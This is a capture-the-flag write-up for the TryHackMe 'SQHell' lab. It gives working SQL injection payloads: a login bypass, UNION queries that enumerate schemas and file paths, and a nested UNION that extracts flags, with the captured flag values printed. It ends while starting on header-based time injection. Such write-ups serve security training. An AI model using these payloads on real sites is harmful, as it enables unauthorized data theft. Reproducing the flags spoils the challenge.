> SQHell | SQLi

We are given a site. Investigating we got some options like Login, Register and some other options too. We can view users and posts too. We also have an interesting Terms & Condition page too! We can just play around we can find many interesting things like change user id or post id gives us result.

1. Login

Credentials : `' or true -- -`:`123` > We have our 1st flag!

# Flag 1

```
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
```

5. View Post

When we click read more we are given with an URL `http://10.10.21.43/post?id=2` which is vulnerable to UNION SQLi. 

# POC: `http://10.10.21.43/post?id='`

We can exploit it using either ORDER BY or UNION SELECT.

```
http://10.10.21.43/post?id=2%20ORDER%20BY%201
http://10.10.21.43/post?id=2%20ORDER%20BY%202
http://10.10.21.43/post?id=2%20ORDER%20BY%203
http://10.10.21.43/post?id=2%20ORDER%20BY%204
http://10.10.21.43/post?id=2%20ORDER%20BY%205 => Here we are prompted with a different output!
```

So we must have 4 columns. Let's see which column is responsive.
```
http://10.10.21.43/post?id=22%20union%20all%20select%20database(),2,3,4
http://10.10.21.43/post?id=22%20union%20all%20select%201,database(),3,4
http://10.10.21.43/post?id=22%20union%20all%20select%201,2,database(),4 => Wow we got our response! sqhell_5 
http://10.10.21.43/post?id=22%20union%20all%20select%201,2,3,database()
```


http://10.10.21.43/post?id=22%20union%20all%20select%201,2,group_concat(0x7c,schema_name,0x7c),4 from information_schema.schemata

```
 |information_schema|,|sqhell_5|
```

http://10.10.21.43/post?id=22%20union%20all%20select%201,2,group_concat(PATH,"\n"),4%20from%20information_schema.INNODB_DATAFILES

To extract complete structure!

```
,./undo_001
,./undo_002
,./sys/sys_config.ibd
,./phpmyadmin/pma__bookmark.ibd
,./phpmyadmin/pma__column_info.ibd
,./phpmyadmin/pma__history.ibd
,./phpmyadmin/pma__pdf_pages.ibd
,./phpmyadmin/pma__recent.ibd
,./phpmyadmin/pma__favorite.ibd
,./phpmyadmin/pma__table_uiprefs.ibd
,./phpmyadmin/pma__relation.ibd
,./phpmyadmin/pma__table_coords.ibd
,./phpmyadmin/pma__table_info.ibd
,./phpmyadmin/pma__tracking.ibd
,./phpmyadmin/pma__userconfig.ibd
,./phpmyadmin/pma__users.ibd
,./phpmyadmin/pma__usergroups.ibd
,./phpmyadmin/pma__navigationhiding.ibd
,./phpmyadmin/pma__savedsearches.ibd
,./phpmyadmin/pma__central_columns.ibd
,./phpmyadmin/pma__designer_settings.ibd
,./phpmyadmin/pma__export_templates.ibd
,./sqhell_1/flag.ibd
,./sqhell_1/hits.ibd
,./sqhell_2/users.ibd
,./sqhell_3/flag.ibd
,./sqhell_3/users.ibd
,./sqhell_4/flag.ibd
,./sqhell_4/posts.ibd
,./sqhell_4/users.ibd
,./sqhell_5/flag.ibd
,./sqhell_5/posts.ibd
,./sqhell_5/users.ibd
```

http://10.10.21.43/post?id=22%20union%20all%20select%201,2,flag,4%20from%20sqhell_5.flag

```
THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} 
```

# Flag 4

## Hints: Well, dreams, they feel real while we’re in them right?

Hmm a dialogue from Inception. Moving onto users `http://10.10.21.43/user?id=1` we are provided with user id, username and posts. Let's again try union sqli payloads. Let's add null and determine the columns now!

```
http://10.10.21.43/user?id=1 union select null;-- -
http://10.10.21.43/user?id=1%20union%20select%20null,null;--%20-
http://10.10.21.43/user?id=1%20union%20select%20null,null,null;--%20- => Looks like we have 3 columns.
```

But we can't get any other payloads working. So I tried to extract table names

```
http://10.10.21.43/user?id=13%20union%20all%20select%201,2,3%20from%20information_schema.tables%20where%20table_schema=database()

This gives us the same page with user id 1!

http://10.10.21.43/user?id=13%20union%20all%20select%202,2,3%20from%20information_schema.tables%20where%20table_schema=database()

But this one doesn't lists the posts with user id 1. Looks like there is no user with id 2 which reults with no posts.
```

So let's try to add another union select statement.

`http://10.10.21.43/user?id=2%20union%20select%20%221%20union%20select%20null,null,null,null%22,null,null;--%20-`

We are reflected with the union statement in user id.

```
User ID:  1 union select null,null,null,null
Username:  
Posts:

    First Post
    Second Post
```

# Finding responsive column

```
http://10.10.21.43/user?id=2%20union%20select%20%221%20union%20select%20flag,null,null,null%20from%20flag%22,null,null%20from%20information_schema.tables%20where%20table_schema=database();--%20-
http://10.10.21.43/user?id=2%20union%20select%20%221%20union%20select%20null,flag,null,null%20from%20flag%22,null,null%20from%20information_schema.tables%20where%20table_schema=database();--%20-
```

And we are provided with flag!

```
THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
```

2. Terms & Condition

```
We only have a few small terms:
i: We own the soul of any visitors
ii: We can't be blamed for any security breaches
iii: We log your IP address for analytics purposes => Let's try injection here!
```

So mostly for logging we use X-Forwaded-For HTTP header.It can be concluded that the IP Address is taken from the header and inserted into the “hits” table inside “sqhell_1” database. We can use time based SQL injection and use sleep, if the header is vulnerable the page will sleep (wait) before returning the page.